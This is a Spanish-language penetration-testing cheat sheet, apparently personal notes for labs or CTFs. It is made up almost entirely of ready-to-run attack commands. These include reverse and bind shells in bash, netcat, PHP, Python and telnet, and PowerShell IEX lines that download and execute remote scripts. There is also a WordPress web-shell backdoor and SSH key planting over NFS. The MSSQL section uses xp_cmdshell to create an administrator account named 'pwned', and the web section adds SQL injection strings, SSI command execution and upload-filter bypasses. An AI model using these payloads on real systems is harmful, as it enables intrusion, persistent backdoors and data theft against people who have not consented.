#MSF
service postgresql start && msfdb init && msfconsole

#Linux
rsh/rlogin USUARIO@IP // Si está habilitado rlogin en el target

#JAVA RMI
use exploit/multi/misc/java_rmi_server

#SSH
ssh-keygen
mount IP:/ /mnt
cat .ssh/id_rsa.pub >> /mnt/root/.ssh/authorized_keys

#NC-NCAT-FTP
**Transferencia de archivos**
    nc -lvp [puerto] > [archivo a guardar]
    nc -vv [ip] [puerto] < [archivo]


**Conectarte a programa y redireccionar salida por nc**
    nc -lvvp [puerto] -e/-c cmd.exe
    nc -v [ip] [puerto]


**Conectar programa a servidor en escucha y redireccionar salida por nc**
    nc -lvvp [puerto]
    nc -v [ip] [puerto] -e/-c /bin/bash


**Ejecutar comando tras conectar nc**
	nc IP PUERTO -c COMANDO (lo ejecuta /bin/sh)/ -e (lo ejecuta exec)

ncat -v IP PUERTO --ssl
ncat --exec cmd.exe --allow IP -vnl PUERTO --ssl

**Descargar todo de ftp**
	wget -m --no-passive ftp://anonymous:anonymous@IP

#Reverse shell
    Recibida con nc -vvv -n -l -p PUERTO
    bash -i >& /dev/tcp/IP_DESTINO/NUM_PUERTO 0>&1
    bash -c "bash -i >& /dev/tcp/IP Atacante/Puerto Atacante 0>&1"
    mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe Para crear bind nc
    ---
    **Para RCE en web**
    mknod /tmp/backpipe p
    /bin/sh 0</tmp/backpipe | nc IP PUERTO 1>/tmp/backpipe
    O probar también
    /bin/sh -c "/bin/sh 0</tmp/backpipe | nc IP PUERTO 1>/tmp/backpipe"
    O también (bind)
    mkfifo /tmp/rfsfu; (nc -l -p 3000 || nc -l 3000)0</tmp/rfsfu | /bin/sh >/tmp/rfsfu 2>&1; rm /tmp/rfsfu
    ---
    mknod backpipe p && telnet IP_Atacante Puerto_Atacante 0<backpipe | /bin/bash 1>backpipe
    php -r '$sock=fsockopen("IP",Puerto);exec("/bin/sh -i <&3 >&3 2>&3");'
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",Port));os.dup2(s.fileno(),0;os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    0<&196;exec 196<>/dev/tcp/IP/PUERTO; sh <&196 >&196 2>&196&		(el & final la pone en background)
    exec 5<>/dev/tcp/IP/PUERTO cat <&5 | while read line; do $line 2>&5 >&5; done&		(el & final la pone en background)

	**WINDOWS:**
		powershell "IEX (New-Object Net.WebClient).downloadString('http://IP:PUERTO/SHELL')"
		powershell -c "IEX(New-Object System.Net.WebClient).DownloadString (‘http://IP/p.ps1’); p.ps1 -c IP -p PORT -e cmd"

  **SHELL PHP FUNCIONAL LINUX**
    <?php
    exec("/bin/bash -c 'bash -i >& /dev/tcp/IP-NUESTRA/PUERTO-NUESTRO 0>&1'");
     ?>

  **Wordpress**
  	Editar hello.php de Hello Dolly y agregar
  		if($_GET['cmd']) {
  		  system($_GET['cmd']);
  		  }


  **Conectarse por mysql**
  	mysql -uUSUARIO -pPASSWORD -h HOST
	

#MSSQL
	use auxiliary/admin/mssql/mssql_exec
	set CMD net user pwned pass000 /ADD
	net localgroup administrators pwned /ADD
	
	Con credenciales:
		use auxiliary/admin/mssql/mssql_enum
		use exploit/windows/mssql/mssql_payload
			set PAYLOAD windows/meterpreter/reverse_tcp
		http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
		SELECT @@version
		SELECT name FROM master..syslogins // Enum users
		SELECT name FROM master..sysdatabases; // Enum dbs
		SELECT DB_NAME()
		use DB
		SELECT HOST_NAME()
		SQL> select @@servername
		select distinct table_name from information_schema.tables
		EXEC sp_addlogin 'user', 'pass';
		EXEC xp_cmdshell 'net user'; -- privOn
	
	SELECT NAME FROM sys.objects WHERE TYPE='U' // Sacar todas las tablas de una base de datos, más rápido que con sqlmap a pelo, requiere de sql-shell
	
	wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/mssqlclient.py
	python mssqlclient.py -port 1433 -db BBDD USER:'PASS'@IP [-windows-auth]
		

#WEB
PHP 5.X probable => exploit/multi/http/php_cgi_arg_injection
curl -T [archivo a subir] [IP target] (Prueba si está habilitado PUT para subir un archivo a la IP mandada)
curl --cookie "[cookie]" --location "[url que queramos ejecutar]"
Si introducimos la url que aparece al hacer un Command Injection o SQL Injection con --data (capturándola con Burp por ejemplo) podemos hacer curl también y redirigir la salida haciendo | tee archivo.txt
También podemos hacer login poniendo la cookie de sesión y el index del sitio una vez se inicia sesión
En la consola del navegador, document.cookie="cookie que queramos usar" para hacer login como otro usuario
En formularios, si el valor de lo que se introduce está en texto plano html, se puede modificar desde el debugger del navegador y mandar el formulario de nuevo
Con SSI (Server Side Includes), siempre que sea archivo shtml podemos ejecutar comandos remotos en el formulario como <!--#exec cmd="ls ../../"-->
Probar en usuarios y contraseñas ' or 1=1;--
Al poder subir archivos, si podemos elegir el nombre del archivo y no se chequea la entrada, podemos subirlos en otras localizaciones usando ../nombreArchivo
Para bypassear filtro de extensión, poner .nuevaExtension
Para bypassear filtro MIME, para imagen poner
	GIF89a
	%PDF-1.4
	al inicio de la shell
php://filter/convert.base64-encode/resource=index
Para formularios que usen XML user:pass del tipo user=X and pass=Y:
	-> '(false) or 1=1(true) or 'a'='a(true) // and false de la pass
